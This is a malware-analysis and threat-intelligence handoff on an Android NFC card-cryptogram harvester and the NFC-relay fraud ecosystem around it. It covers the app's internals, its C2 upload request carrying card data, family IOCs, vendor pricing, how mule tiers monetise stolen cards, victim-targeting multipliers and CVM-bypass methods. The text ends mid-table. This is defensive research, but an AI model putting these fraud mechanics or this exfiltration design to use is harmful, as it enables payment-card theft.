# `ckemv-harvester` — Master Research Handoff Document

**Subject:** Static analysis, ecosystem mapping, and threat-hunt status for the Android NFC/EMV card-cryptogram harvester sample identified as `xyz.happify.ckemv` ("Geometry Saver"), exfiltrating to `https://tqqemv.xyz`.

**Investigation period:** 2026-05-16
**Investigator:** Independent security research
**Document purpose:** Comprehensive handoff for follow-on agent or analyst. Reads cold — no prior session context required.
**Classification suggestion:** TLP:AMBER (rules, IOCs, methodology shareable; sample binary itself coordinated-disclosure only).

---

## 0. How to Use This Document

This document is the **table of contents and synthesis** for the full investigation. Sections 1–4 cover the sample itself; sections 5–7 cover the criminal economy and ecosystem; section 8 is the Telegram/vendor registry; section 9 is the live infrastructure inventory; sections 10–13 are operational guidance and references.

Four companion documents in this directory contain the deep dives this synthesis points at:

| File | Scope |
| --- | --- |
| `CKEMV_HARVESTER_ANALYSIS.md` | Full static reverse-engineering of the APK + both native libraries |
| `CKEMV_MONETIZATION_AND_LIMITS.md` | How harvested cryptograms are monetized, CVM/floor bypasses, regional blocks, tokenization analysis, country-by-country yield |
| `CKEMV_THREAT_HUNT_PACK.md` | YARA rules, IOCs, Sigma/Snort drafts, OSINT pivot plan, family-attribution cross-check |
| `CKEMV_MASTER_RESEARCH_HANDOFF.md` | (This document) — synthesis + Telegram registry + handoff guidance |

For a new agent picking this up: **start by reading sections 1, 2, 3 here, then read `CKEMV_HARVESTER_ANALYSIS.md` for the technical detail, then return here for the ecosystem and handoff guidance.**

---

## 1. Investigation Scope and Conclusions

### 1.1 What this investigation answers

The investigation was triggered by acquisition of an Android APK named `samples/ckemv/sample.apk` (6.76 MB) in the working directory `C:\Users\mogli\Desktop\Prj\Research\`. The owner of that directory had already produced a prior research artifact, `Ghost_Tapping_Guarantee_Marketplaces_Research.md` (April 2026), mapping the Chinese-language guarantee-marketplace ecosystem on Telegram. That existing context made it immediately clear the APK was a contemporary NFC-relay malware sample.

The questions the investigation addresses:

1. **What does this APK do?** — Static reverse engineering of all components.
2. **Who built it?** — Operator OPSEC fingerprinting (build paths, language, toolchain).
3. **What family / lineage is it?** — Cross-reference against every publicly tracked NFC-relay malware family.
4. **What does the C2 do?** — Network behavior, endpoint contract, infrastructure liveness.
5. **How does it monetize?** — Criminal-economy walkthrough from harvester mule to cashout to laundering.
6. **What are the limits of the attack?** — EMV cryptogram lifecycle, CVM/floor bypass mechanics, tokenization defeat, regional blocks, ATC dynamics.
7. **Who else is in this space?** — Vendor / marketplace / handler / phishing-kit ecosystem on Telegram.
8. **What's the threat-hunting opportunity?** — YARA rules, IOC pack, sharing recipients.

### 1.2 Headline conclusions

- **The sample is an Android NFC/EMV cryptogram harvester** — a "field-collection" tool that converts an Android phone into a covert contactless reader, captures up to 20 EMV cryptograms per card-tap with attacker-chosen amount/date/currency/UN parameters, and uploads them to the operator's C2 every 10 seconds.
- **The C2 is `https://tqqemv.xyz`** — currently live, Let's Encrypt cert issued 2026-03-28, expires 2026-06-26. No payload-layer crypto, no TLS pinning, stock Mozilla CA bundle.
- **The technical implementation is significantly more advanced than the publicly documented NFC-relay families.** Two stripped Rust JNI libraries (`libckemv_android.so` 1.08 MB, `libckemv_reporter.so` 3.01 MB) implement a full custom EMV state machine (Visa qVSDC + Mastercard M/Chip kernels, RSA-based SDA/DDA cert chain verifier, deterministic-UN mode) and a `ureq` + `rustls` + `ring` HTTPS client. No use of NFCGate, NFCProxy, or any open-source NFC stack — entirely custom Rust.
- **The sample is NOT one of the publicly tracked families.** Cross-checked against ESET NGate / NFSkate / HandyPay variants (23 hashes, 23 C2 domains, 11 IPs), Cleafy SuperCard X (3 hashes, 3 C2 domains), Zimperium's 760-sample NFCStealer corpus (Russian-EE hosting), Resecurity Z-NFC (`znfcqwe.top`, `libjiagu.so`), ThreatFabric Ghost Tap / PhantomCard, Group-IB TX-NFC / X-NFC / NFU Pay / KingNFC, Cyble RelayNFC, NFC Ripper (`nfcripper.su`). **Zero IOC overlap with any of them.**
- **Working hypothesis on attribution:** a previously undocumented brand within the Chinese-language NFC-relay MaaS ecosystem, most likely either (a) a boutique private build for a specific syndicate (consistent with the `@webu8`-style "proprietary software loaned with phones, not sold publicly" model documented by Recorded Future) or (b) a new MaaS brand about to surface. Operator/developer build-host username **`arthur`** is recoverable from both native libraries (macOS, Rust 1.88/1.91, NDK r25b).
- **The criminal-economy model the sample fits is the harvester-only upstream tier**, distinct from the live-relay (HCE/"Tapper") tier of SuperCard X / TX-NFC / NFU Pay / NFC Ripper. The sample has no HCE component — it captures and uploads, then a separate cashout tool (or a same-operator separate APK) handles burning. This means it most likely operates inside a vertically-integrated operator stack rather than as a standalone MaaS product.
- **Confidence levels:** Static technical claims = High. Family-attribution = Moderate (working hypothesis; needs vendor-side corroboration). Operator attribution = N/A — investigation did not pursue personal identification, only build-host fingerprints. Live-C2 status = High (cert evidence within 60 days).

### 1.3 What is still open

1. **What does `/me` actually return?** — Inferred from `MeResponse` Kotlin class to be `{name, cves[], latest_version}`, but no actual response body has been observed (passive analysis only).
2. **What does `/report` do?** — Endpoint exists in the native lib, has no Java caller. Reserved? Operator dashboard fetch? Partner-tenant pull API? Unknown.
3. **Is there a sibling APK with HCE/cashout capability** that consumes the same C2 contract? Strongly suspected but not directly observed.
4. **Are sibling `.xyz` domains** registered by the same operator? crt.sh batch search for the `tqqemv.xyz` registration window is open work.
5. **Is `arthur` reachable through any public Rust-ecosystem footprint** (crates.io, GitHub forks of `iso7816-tlv` / `jni-rs`)? Open OSINT pivot.
6. **Is the `ckemv-emv-kernel` Rust workspace leaked anywhere** — internal git, paste-bins, code-leak channels? Open OSINT pivot.

---

## 2. Sample at a Glance

| Property | Value |
| --- | --- |
| Filename | `samples/ckemv/sample.apk` |
| Size | 6,755,535 bytes (6.76 MB) |
| Package | `xyz.happify.ckemv` |
| Display label | "Geometry Saver" (decoy) |
| Min SDK / Target SDK | 26 / 34 (Android 8.0 – 14) |
| Internal version | 1.7 (per `t.java` self-update threshold) |
| Native architecture | `arm64-v8a` only |
| Native libraries | `libckemv_android.so` (1.08 MB, EMV kernel) + `libckemv_reporter.so` (3.01 MB, C2 client) |
| Implementation language (natives) | Rust 1.88.0 (reporter) / 1.91 (kernel), NDK r25b clang 14.0.6 |
| Java/Kotlin surface | 10 Java files (~1.3 KLOC sans R.java) + 23 obfuscated Kotlin files in `B2/` (~2.3 KLOC) |
| Local DB | SQLite `CkemvHarvest.db` v8 (tables: `cards`, `transactions`, `cves`, `stats`) |
| C2 host | `https://tqqemv.xyz` |
| C2 endpoints | `/me` (config-fetch), `/harvest` (upload), `/report` (reserved) |
| C2 transport | `ureq/2.12.1` + `rustls 0.23.37` + `ring 0.17.14` — no TLS pinning, no payload-layer crypto |
| Operator-OPSEC build fingerprint | `/Users/arthur/.cargo/registry/` — macOS build host, user `arthur` |
| Decoy UI | Animated dots-and-lines screensaver on dark background (`B2/w.java`) |
| Operator UI | Two long-press gestures on the decoy: paste-text dialog for API key, ZXing QR scanner for API key enrollment |
| Self-update | Polls `/me` every 60s; if `latest_version > 1.7`, POSTs `{"api_key": "..."}` to C2, streams response APK to `update_v{x}.apk`, fires FileProvider sideload intent |
| Persistence | Periodic 15-min WorkManager (`SyncWorker`) + foreground coroutines + battery-optimization-exempt prompt |
| Permissions of note | NFC, INTERNET, CAMERA, REQUEST_INSTALL_PACKAGES, WAKE_LOCK, FOREGROUND_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, RECEIVE_BOOT_COMPLETED |

See `CKEMV_HARVESTER_ANALYSIS.md` §3 for the full manifest dissection.

---

## 3. Behavior Walkthrough

### 3.1 Operator enrollment

1. Operator installs the APK on a burner Android phone (sideloaded — no Play Store distribution observed for this package).
2. Opens app — sees the decoy "Geometry Saver" dots-and-lines screen with a faint "Active •" indicator.
3. **Long-presses one of two hidden hot zones**:
   - The empty status text → AlertDialog with paste-text field → operator pastes their `api_key` into the local `stats.api_key` column.
   - The right-side icon row → launches ZXing barcode scanner with prompt "Scan Collector API Key" → operator scans a QR code containing the key.
4. Phone is now enrolled. There is no login, no settings, no other UI.

### 3.2 Card-tap harvest

1. Any contactless EMV card brought within NFC range fires `TAG_DISCOVERED` / `TECH_DISCOVERED` / `NDEF_DISCOVERED` intents to `MainActivity` (foreground-dispatched in `onResume`).
2. `B2/q.java` coroutine launches:
   - `IsoDep.connect()`, `setTimeout(10000)`.
   - Pre-loaded scenarios (`CveConfig` rows) read from the local `cves` table.
   - **SELECT PPSE** (`00 A4 04 00 0E 2PAY.SYS.DDF01 00`).
   - Scheme inference from response: AID prefix `A000000003` → Visa; `A000000004` → Mastercard; otherwise "Unknown".
   - Filter scenarios where the matching `mastercard_tags` / `visa_tags` map is non-empty.
   - For each surviving scenario × 3 date offsets (today, +1, +2) × inner-loop count (8/8/4 = up to 20 per scenario per card):
     - Builds tx parameters (`9F02` amount with random jitter and 5% decay; `9A` date in `Locale.CHINA` `yyMMdd` format; scenario's `mastercard_tags` or `visa_tags` overlay).
     - `EmvKernel.initialize(true /* contactless */, jsonParams)` — fires up the native Rust EMV kernel.
     - Tight loop: while `getStatus() == "InProgress"`, `getNextCommand()` → `isoDep.transceive(hex)` → `processResponse(responseHex)`.
     - On loop exit, read `getAtc / getArqc / getPan / getAid / getRawData / getTxParameters`.
     - If `arqc` is non-empty, append a `HarvestedTx(atc, arqc, elapsed_ms, params, cve_id)` to the per-card list.
3. Wrap into `CardRecord(pan, aid, network, rawData, txs)`. Insert into local DB.
4. Fire async upload coroutine `B2/o.java` to push the card immediately to `/harvest`.

### 3.3 Background loops

Two endless coroutines launched in `MainActivity.onCreate`:

| Coroutine | File | Cadence | Behavior |
| --- | --- | --- | --- |
| Upload loop | `B2/s.java` | 10 s | Walk `cards` table; for each, POST canonical JSON to `Reporter.uploadHarvestData(api_key, "https://tqqemv.xyz", json)`. On `"Success"` substring in response, delete locally + increment `stats.total_scans`. |
| Config / self-update loop | `B2/t.java` | 60 s | `Reporter.fetchCves(api_key, "https://tqqemv.xyz")` → parse `MeResponse` with Gson → replace `cves` table contents. If `latest_version > 1.7`, fire `MainActivity.w()` which POSTs `{api_key}` to C2, streams response APK to `Environment.DIRECTORY_DOWNLOADS/update_v{major.minor}.apk`, then fires `B2/h.java` which launches `ACTION_VIEW` with `application/vnd.android.package-archive` on the file via `xyz.happify.ckemv.fileprovider`. |

A redundant `androidx.work.WorkManager` periodic job (`SyncWorker.java`, 15-min interval) performs only the `fetchCves` half — survives activity death.

### 3.4 Canonical harvest upload payload

```jsonc
POST https://tqqemv.xyz/harvest
Authorization: Bearer <api_key>             // inferred; api_key passed as JNI arg
Content-Type: application/json
User-Agent: ureq/2.12.1

{
  "pan": "4123…",
  "aid": "A0000000031010",
  "network": "Visa",
  "tx_count": 20,
  "raw_data": { /* TLV map from EmvKernel.getRawData() */ },
  "harvested_txs": [
    { "atc": "0042", "arqc": "5A1F09…", "time_ms": 187.5, "cve_id": 3,
      "params": { "9F02": "000000010000", "9A": "260516", "9F1A": "0840", … } },
    /* … up to 20 of these per card … */
  ]
}
```

See `CKEMV_HARVESTER_ANALYSIS.md` §6 for line-by-line walkthrough, including the obfuscated `B2/` Kotlin glue and the SQLite schema verbatim.

---

## 4. Family Attribution — Cross-Reference Matrix

Detailed in `CKEMV_THREAT_HUNT_PACK.md` §1, summarized here:

| Family | Source | Distinguishing IOCs | Match? |
| --- | --- | --- | --- |
| NGate (original 2024) | ESET, `github.com/eset/malware-ioc/ngate` | C2s: `piaystore.org`, `devilxclusive.lol`, `applay-store.com`, `calxabank.info`, `raiffeisen-cz.eu`, `mobil-csob-cz.eu`, etc. (Czech-bank phishing themes). IPs: `65.109.108.183`, `45.144.55.124`, etc. | ❌ No overlap |
| NGate HandyPay variant (2026) | ESET | Trojanized HandyPay (com.handy.pay); AI-generated patches; Brazilian bank impersonation | ❌ No overlap |
| SuperCard X | Cleafy (April 2025) | C2: `api.kingnfc.com`, `api.kingcardnfc.com`, `api.payforce-x.com`. mTLS. Reader+Tapper modular. 360 Jiagu packed. | ❌ No overlap |
| PhantomCard | ThreatFabric (Brazil) | Package: `com.billy.cardemv`. NFU Pay derived. | ❌ No overlap |
| RelayNFC | Cyble (Brazil) | Hermes-compiled payload. | ❌ No overlap |
| TX-NFC | Group-IB, Resecurity | NFCProxy-derived; 360 Jiagu packed; Reader+Tapper apps. | ❌ No overlap |
| X-NFC | Group-IB, Resecurity | Telegram channel Dec 2024; nearly identical GUI to Z-NFC. | ❌ No overlap |
| Z-NFC | Resecurity HUNTER | C2: `znfcqwe.top`. Package: `com.hk.nfc.paypay`. Native: `libjiagu.so`, `libjgdtc.so`. | ❌ No overlap |
| NFU Pay | Group-IB | First seen April 2025; ~$400/month; redistributed as PhantomCard. | ❌ No overlap |
| KingNFC | Resecurity | Dark Web vendor; limited public IOCs. | ❌ No overlap |
| NFC Ripper | `nfcripper.su` / `nfcripper.app` vendor pages | Vendor `@jinkusu`, support `@onefortress`. CCID hardware reader pairing. Reader+Tag relay. $30K source-code price tag. Has Capture/Clone/Replay modes. | ❌ No overlap (but architecturally closest — see §4.2) |
| Track2NFC | Texas FCIC / USSS / FBI advisory Oct 2024 | Magstripe-to-NFC conversion; forces offline mode. | ❌ No overlap |
| HCE Bridge | iso8583.info ($100 license) | EMV kernel simulator (all 6 schemes). | ❌ No overlap |
| Zimperium 760-sample NFCStealer corpus (Oct 2025) | `github.com/Zimperium/IOC/2025-10-NFCStealer` | Russian/EE-hosted on `188.127.*.*:30xx`. | ❌ No overlap |

### 4.1 Why `ckemv-harvester` is technically distinct from all of the above

| Property | Documented families | `ckemv-harvester` |
| --- | --- | --- |
| Language | Java/Kotlin + NFCGate/NFCProxy/HCE | **Rust JNI** (zero open-source EMV stack reused) |
| Architecture | Reader+Tapper modular (two apps) | **Harvester-only** (no Tapper/HCE component) |
| EMV engine | Open-source NFCGate or trivial APDU pass-through | **Custom EMV state machine** — Visa qVSDC + Mastercard M/Chip kernels, SDA/DDA cert chain (RSA via `num-bigint`), deterministic-UN mode |
| HTTP client | OkHttp (Java) | `ureq 2.12.1` (Rust) + `rustls 0.23.37` + `ring 0.17.14` |
| TLS posture | mTLS (SuperCard X) or naked HTTP | Stock public-CA, **no pinning, no payload crypto** |
| Packing | 360 Jiagu (TX-NFC, X-NFC, Z-NFC) | **None** — clean Rust JNI, `obfstr`-style XOR strings only |
| Operator OPSEC | Chinese-attribution markers, Telegram channel branding | **`arthur` macOS build host, no Chinese strings, no Telegram in code** |
| C2 path style | `api.<brand>nfc.com` | **`/me`, `/harvest`, `/report` on `<random>.xyz`** |
| Self-update | Rare in public families | **In-app APK sideload via FileProvider** (`update_v{x}.apk`) |

### 4.2 Where it most closely resembles the public ecosystem

The closest architectural cousin is **NFC Ripper** (`nfcripper.su`), which advertises:
- "Capture, save cards, clone and replay"
- A web dashboard with "EMV amounts" tracked by currency / date / time
- Per-session card logs

That feature set overlaps with our sample's harvested-cryptogram model (per-tx amount/date/scheme captured). But the implementation is different: NFC Ripper uses Reader+Tag phone pairs through a relay server with CCID hardware support; our sample is single-app, no CCID, harvester-only. Different products from different vendors. NFC Ripper is sold openly via `@jinkusu` at $700/3-day, $3,000/month, $15,000/year, $30,000 source code; our sample shows no equivalent public storefront.

### 4.3 Working hypothesis

`ckemv-harvester` is a **boutique private build** within the Chinese-language NFC-MaaS ecosystem — most likely:
- Operated by a single syndicate that maintains an in-house developer (`arthur`) rather than buying off-the-shelf MaaS.
- Affiliated with one of the Putian/Fujian operators (`@webu8`-class) who have been documented running proprietary tools they don't sell publicly.
- Used as the **harvest upstream** to a separately-built cashout tool (HCE/Tapper) that consumes the same C2 contract.

Alternative hypothesis: a brand-new MaaS that has not yet surfaced in researcher reporting. Operators sometimes run quietly for 6–12 months before promoting on Telegram. The sample's relatively polished engineering and the live-cert timestamp (March 2026) are both consistent with a young-but-mature operation.

---

## 5. Criminal-Economy Model (How the Stolen Data Becomes Money)

Full detail in `CKEMV_MONETIZATION_AND_LIMITS.md`. Compressed walkthrough here.

### 5.1 The actors

| Tier | Role | Description |
| --- | --- | --- |
| **Bottom** | Harvester mule | Holder of the burner phone with `ckemv-harvester` installed. Taps customer cards in restaurants, gas stations, pharmacies, "fake bank verification" voice scams. Paid ~€100/card. Highest legal risk. |
| **Mid-bottom** | Cashout mule | Walks into a real merchant with an HCE-enabled phone (likely a *different* APK that consumes the same C2). Taps phone at register; the stored cryptogram authorizes a real transaction. Walks out with goods. ~€40/successful burn. |
| **Mid** | Fence | Receives goods from cashout mule, resells via Telegram channels / eBay / Carousell / Mercari. Takes ~40% haircut. |
| **Mid-top** | Operator / SaaS provider | Owns the C2 (`tqqemv.xyz`). Manages the matching engine that routes harvested cryptograms to cashout mules. May rent the platform to multiple affiliate crews (SaaS model) or run vertically integrated (own crews). |
| **Top** | Kingpin / leader | Behind Tor and crypto. Manages infrastructure budgets, recruits middle managers, owns the laundering pipeline. Typically retires wealthy before law enforcement traces them. |

### 5.2 The economic flow (per €447 successful card burn)

```
€447 stolen merchandise at MediaMarkt Warsaw
  ├─► €280 sold by fence (60% of retail)
  │    ├─► €100 paid to harvester mule (you, the waiter)
  │    ├─►  €40 paid to cashout mule (Warsaw)
  │    ├─►  €20 fence's cut
  │    └─► €120 to SaaS operator
  └─► €447 chargeback eaten by the merchant (per EMV liability shift)
```

Cardholder is whole (refunded by bank). Merchant absorbs the loss.

### 5.3 Scenario multipliers — when the operator wins big

The headline scenario (waiter taps a normal customer at dinner; cardholder notices within hours) yields modest per-card economics. Two multipliers stack to make the operator dramatically more profitable:

1. **Elderly victim** — paper-statement-only, no banking-app push notifications, monthly review cadence. Detection window stretches from ~30 minutes to **30 days**. The operator can burn 12–15 of the 20 harvested cryptograms instead of 1. Per-card yield goes from ~€400 gross to ~€5,000+ gross.
2. **Own-shop cashout** — operator owns or partners with a complicit merchant (electronics, gold, money-transfer, crypto storefront, adult entertainment). Eliminates cashout-mule cut and fence haircut. Margins flip from ~5% to ~80% of gross. Combined with elderly victim: per-card net to operator goes from ~€100 to **~€3,000–€5,000**.

Both multipliers are **deliberately engineered into the criminal pipeline.** The "fake bank security department" voice scams almost exclusively target elderly residential landlines. The bust-out-merchant / complicit-merchant model is exactly what the @webu8 ecosystem in Putian/Fujian runs.

### 5.4 The ATC freshness constraint — what limits the attack

Every harvested cryptogram has a one-shot expiry tied to its EMV `9F36 ATC` (Application Transaction Counter). Once the cardholder taps their card legitimately again, the chip increments its ATC; every cryptogram with a lower ATC than the new highest-seen is **dead** as soon as the issuer logs the legitimate transaction.

This is the structural reason the entire pipeline is engineered for speed:
- 10-second upload loop on the harvester side.
- 15–90 minute time-to-burn on the cashout side.
- Real-time matching engine on the C2 instead of human dispatch.

The race the operator is winning is **not** against the cardholder's next-tap-ever — it's against **the cardholder noticing fraud and freezing the card**. Industry numbers show 30–70% of harvested cards yield at least one successful burn before the card is frozen.

### 5.5 The CVM-floor problem (PIN-required-above-limit) and bypass families

Contactless ceilings (PIN required above): €50 EU, £100 UK, ~$100 US, ₹5,000 India, A$200 AU. Above floor, the issuer demands cardholder verification (PIN, signature, or CDCVM).

Four documented bypass families:

| Family | Mechanic | Defense status |
| --- | --- | --- |
| Sub-floor stacking | Keep each transaction below floor; stack many. | Card's offline-counter caps; issuer ML on velocity. |
| CVM downgrade | Rogue softPoS strips `TVR`/`TSI` bits, claims "no CVM required" to issuer. Worked best against Visa qVSDC (Galloway/Yunusov 2019). | Visa patched scheme-side; uneven issuer enforcement. |
| CDCVM abuse | softPoS claims "Consumer Device CVM passed" (the Apple-Pay-biometric flag) on a plastic card. Limits balloon to thousands. Issuer must cross-check `9F10 IAD` for evidence. | Patchy — strong issuers catch it, smaller ones don't. |
| Terminal-type spoofing | Claim unattended-fuel-pump or transit-attendant terminal type. Card's CVM list skips verification for those. | Patched scheme-side; pockets remain on legacy issuers. |

Real defense: PSD2 / RBI / etc. SCA mandates for online channels, plus mandatory ATC monotonicity at issuer hosts, plus tokenization.

### 5.6 Tokenization (Apple Pay / Google Pay / Samsung Pay) impact

**Tokenization substantially defeats this attack class.** When a card is added to a mobile wallet, the wallet provider asks the scheme's Token Service Provider (Visa VTS / Mastercard MDES / AmEx TS) to issue a **DPAN** (Device Primary Account Number) bound to the device's secure element (Apple Secure Enclave, Android Strongbox/TEE, Samsung Knox).

Capturing a tap from a tokenized wallet yields a DPAN cryptogram tied to a specific **Token Requestor ID** (TRID). The TSP cross-checks TRID-to-acquirer routing on every transaction. Relay against a mismatched merchant context fails the TSP's validation regardless of whether the issuer's own ATC check passes. The token can also be revoked in seconds by the wallet provider.

Plus: every tokenized wallet enforces **CDCVM** on every tap (biometric / passcode / device unlock). The harvester literally cannot get a cryptogram out of a tokenized wallet unless the victim authenticates on their own device at the moment of tap. This is why the criminal ecosystem has pivoted to **(a) provisioning fraud** (stealing OTPs to enroll the victim's card into the attacker's wallet) and **(b) CDCVM social engineering** (tricking the victim into authenticating while malware emulates their wallet via HCE — the SuperCard X model).

`ckemv-harvester`'s realistic target population is **physical plastic contactless cards in markets with low wallet adoption**: India for plastic cards, parts of LATAM, MENA, much of EU/UK plastic-card carriers, parts of US not on Apple Pay. That target population is still wide enough to be highly profitable, but it's narrowing year-over-year.

---

## 6. EMV Cryptogram Lifecycle vs. Magstripe (the question that opened the investigation)

A common-but-wrong framing is "harvested cryptograms = magstripe dumps, reusable forever." They are not.

| Property | Magstripe Track 2 (carding "101" / "201") | EMV ARQC |
| --- | --- | --- |
| Static vs dynamic | **Static** | **Dynamic, per-transaction** |
| Reuse per capture | **Infinite** (until card cancelled) | **One** (each ARQC) |
| Yield per skim | 1 snapshot, unlimited shots | ~20 snapshots, ~20 shots |
| Freshness anchor | None | Monotonic `ATC` counter |
| Parameter binding | None | Bound to amount/date/currency/UN/country |
| Window of validity | Months (until cancel) | **Hours to days** (until ATC overtaken) |
| Cryptographic protection | None | 3DES or AES MAC, key never leaves chip |
| Issuer detection on replay | Difficult | Trivial (ATC regression) |

A captured ARQC is more like a **single-use voucher** than a card clone. The harvester's "batch of 20" is the operator's *inventory of shots per card*, used to match different merchant amounts at burn time — not to enable multiple burns from one harvest.

This is the entire reason EMV exists. Magstripe fraud was solved by EMV; EMV fraud is now constrained to time-windowed, parameter-bound, one-shot replay/relay — fundamentally a much smaller problem space.

---

## 7. The Chinese-Language NFC-Relay MaaS Ecosystem (2024–2026)

This is the contextual ecosystem `ckemv-harvester` operates within. The investigation pivoted from the sample outward to the broader market in three concentric rings: **vendors** (who sells the malware), **marketplaces** (where the buyers and sellers transact), and **operational actors** (the recruiters, mule handlers, fences, transport, phishing kits).

### 7.1 Timeline of named brands

| Date | Brand | Origin | Status (May 2026) |
| --- | --- | --- | --- |
| Aug 2024 | NGate / NFSkate | ESET research (originated Czech banks Nov 2023) | Active; HandyPay variant deployed in Brazil Nov 2025 |
| Nov 2024 | Oedipus / TX-NFC affiliate | Telegram (Nov 11 2024) | Active |
| Nov 2024 | Ghost Tap (TTP name) | ThreatFabric framing | Tracked umbrella technique |
| Jan 2025 | TX-NFC | Telegram (Jan 7 2025); 21,000+ subs | Active, largest vendor |
| Feb 2025 | Z-NFC | Telegram, Chinese-language manuals | Active |
| Mar 2025 | First Tennessee arrests | Knoxville, 11 Chinese nationals | Law enforcement milestone |
| Apr 2025 | SuperCard X | Cleafy (April 2025); Italy first | Active |
| Apr 2025 | NFU Pay | First seen Apr 1 2025; ~$400/mo | Active (redistributed as PhantomCard, others) |
| Aug 2025 | PhantomCard | ThreatFabric (Brazil); "Go1ano developer" | Active |
| Oct 2025 | Zimperium 760-sample NFCStealer corpus | Public disclosure | Russian/EE ecosystem |
| Nov 2025 | NGate HandyPay variant | ESET (Brazil) | Active, GenAI-assisted |
| 2025 | X-NFC | Nearly identical to Z-NFC | Active |
| 2025 | KingNFC | Dark Web | Limited current data |
| 2025 | UFO NFC | Resecurity (limited reporting) | Active (combined with Z-NFC/X-NFC) |
| 2025 | NFC Ripper | `nfcripper.app` / `nfcripper.su` ; sold by `@jinkusu` | Active; previous TG channel taken down → migrated to `@onefortress` |
| 2026 | RatOn | NFSkate-based | Active |
| **2026** | **`ckemv-harvester`** (this sample) | Undocumented; `tqqemv.xyz` C2 cert issued 2026-03-28 | **Active, no public attribution** |

### 7.2 Vendor profiles (current as of May 2026)

#### TX-NFC

| Attribute | Value |
| --- | --- |
| Telegram channel | TX-NFC (handle redacted in public reporting) |
| Established | 2026-01-07 |
| Subscribers | 21,000+ |
| Admins | 3 individuals |
| Support hours | 18:00–10:00 + 08:00–12:00 Beijing time, English-language |
| Pricing | $45 / 1 day, ~$500 / month, $1,050 / 3 months |
| Tech base | NFCProxy-derived |
| Packing | 360 Jiagu |
| Architecture | Reader+Tapper (two separate apps) |
| Affiliate channel | Oedipus (Nov 11 2024; 500+ subs; advertises POS terminals across MEA / Asia / Africa; ~$355K processed Nov 2024 – Aug 2025) |

#### X-NFC

| Attribute | Value |
| --- | --- |
| Established | 2024-12-16 |
| Group members | 5,000+ |
| Pricing | Subscription with license activation |
| GUI | Nearly identical to Z-NFC (likely same dev) |
| Mode | Single device flips between "card" and "POS" |
| Documentation | Detailed Chinese-language manuals |

#### Z-NFC

| Attribute | Value |
| --- | --- |
| First identified | Resecurity HUNTER |
| Pricing | ~$500/month, $1,000+ custom dev |
| C2 | `znfcqwe.top` |
| Package | `com.hk.nfc.paypay` |
| Native libs | `libjiagu.so`, `libjgdtc.so` (360 Jiagu packer artifacts) |
| Architecture | Malware loader + native code injection + HCE |
| Support | 24/7 Telegram |

#### NFU Pay

| Attribute | Value |
| --- | --- |
| First seen | 2025-04-01 |
| Pricing | ~$400/month |
| Features | Reader + Tapper (same pattern as X-NFC) |
| Resellers | Redistributed under multiple names globally |
| Notable variant | PhantomCard (Brazil; reseller "Go1ano developer", known Android threat reseller in BR) |

#### SuperCard X

| Attribute | Value |
| --- | --- |
| Identified | Cleafy April 2025 |
| Creator | Chinese-speaking |
| Apps | Reader (blue icon) + Tapper (green icon) |
| Custom build | "Verifica Carta" (Italian variant) |
| Card emulation | ATR-based |
| C2 | `api.kingnfc.com`, `api.kingcardnfc.com`, `api.payforce-x.com` |
| Transport | mTLS |
| Sample hashes | `2c6b914f9e27482152f704d3baea6c8030da859c9f5807be4e615680f93563a0` (Verifica Carta), `3f39044c146a9068d1a125e1fe7ffc3f2e029593b75610ef24611aadc0dec2de` (SuperCard X), `3fb91010b9b7bfc84cd0c1421df0c8c3017b5ecf26f2e7dadfe611f2a834330c` (KingCard NFC) |
| AV detection | Very low (Cleafy noted ~0 engines on VT at disclosure) |
| Connection | Possibly tied to @webu8's proprietary tooling (unconfirmed by Cleafy/Recorded Future) |

#### NFC Ripper (**new intel from this investigation**)

| Attribute | Value |
| --- | --- |
| Vendor handle | `@jinkusu` (Telegram user; English-language disclaimer "We do not encourage illegal activities…") |
| Support channel | `@onefortress` (2.54K subs as of May 2026; English; replacement after previous TG ban) |
| Other Jinkusu products | Jinkusu CAM (face-swap, $350 / 3 hours); Jinkusu Attack (L4/L7 DDoS, `jinkusuattack.tokyo`); IntelX Researcher Account ($300 vs $2,500/year stated retail) |
| Domains | `nfcripper.su`, `nfcripper.app`, `jinkusucam.tokyo`, `jinkusuattack.tokyo`, `thevadernews.dev` |
| NFC Ripper pricing | $700 / 3-day test, $3,000 / month, $15,000 / year (with hosting), **$30,000 source-code one-time** |
| Architecture | Reader + Tag relay through TCP server (TCP/TLS), optional CCID-hardware reader (ACR1552U, ACR122U, Rocketek USB-C) |
| Features | Capture, save cards, clone, replay; CVM bypass methods (no-PIN, signature, accept-any-PIN, ATM-specific); web dashboard with devices/cards/sessions/blacklist/whitelist/live-log; Telegram notifications integration |
| Card support | EMV chip, contactless EMV, Visa MSD via Track2NFC integration |
| Sample-product overlap with `ckemv-harvester` | Closest architectural cousin in the public ecosystem (capture-and-replay framing) but **no IOC overlap** |

#### KingNFC

| Attribute | Value |
| --- | --- |
| Distribution | Previously Dark Web |
| Current status | Limited current intel; possibly absorbed into SuperCard X family (note `api.kingnfc.com` as SuperCard X C2 — potentially same operator group) |

#### Track2NFC

| Attribute | Value |
| --- | --- |
| Function | Converts magstripe Track 2 dumps for NFC terminal use; forces merchant payment terminal into offline transaction mode |
| Public advisory | Texas Financial Crimes Intelligence Center + USSS + FBI (October 2024) |
| Blogspot mirror | `track2nfc.blogspot.com` |
| Telegram presence (BR) | `@track2nfcnegan` (now pivoted to counterfeit currency sales) |
| GitHub | `github.com/myNinjax/TRACK2NFC` (open-source variant present) |
| Integration | NFC Ripper bundles Track2NFC functionality |

#### HCE Bridge

| Attribute | Value |
| --- | --- |
| Origin | `iso8583.info` ("educational") |
| Price | $100 |
| Function | EMV kernel simulator implementing all 6 EMV CL kernels (PayPass, PayWave, Expresspay, J/Speedy, D-PAS, QuickPass) |
| Use | Exploited by cybercriminals as a generic HCE-side substrate |

#### `ckemv-harvester` (this sample)

| Attribute | Value |
| --- | --- |
| Public attribution | None — undocumented in all public corpora |
| C2 | `https://tqqemv.xyz` (Let's Encrypt issued 2026-03-28) |
| Architecture | Harvester-only (no HCE/Tapper component) |
| Implementation | Rust JNI (custom EMV kernel + custom C2 client) |
| Build OPSEC | macOS, user `arthur`, Rust 1.88/1.91, NDK r25b |
| Crate workspace | `ckemv-android`, `ckemv-reporter`, `ckemv-emv-kernel` |
| Pricing | Unknown (no public storefront found) |
| Likely position | Boutique private build; harvest-upstream feeder to a separate cashout tool |

### 7.3 Guarantee marketplaces (escrow infrastructure)

These are the trust-escrow platforms where harvester operators, cashout teams, card-data shops, mule handlers, and transport services meet and transact.

| Marketplace | Chinese name | Status (May 2026) | Volume | Key handles |
| --- | --- | --- | --- | --- |
